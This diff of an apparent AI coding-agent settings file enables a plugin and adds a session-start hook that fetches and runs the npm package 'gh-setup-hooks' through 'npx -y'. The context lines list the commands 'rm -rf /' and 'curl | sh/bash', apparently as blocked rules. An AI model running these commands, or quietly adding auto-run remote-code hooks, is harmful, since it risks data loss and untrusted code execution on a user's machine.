@@ -1,4 +1,7 @@
 {
+  "enabledPlugins": {
+    "superpowers@claude-plugins-official": true
+  },
   "permissions": {
     "allow": [
       "# === Version Control ===",
@@ -58,6 +61,19 @@
       "Bash(rm -rf /)",
       "Bash(curl * | sh)",
       "Bash(curl * | bash)"
+    ]
+  },
+  "hooks": {
+    "SessionStart": [
+      {
+        "hooks": [
+          {
+            "type": "command",
+            "command": "npx -y gh-setup-hooks",
+            "timeout": 120
+          }
+        ]
+      }
     ]
   }
 }
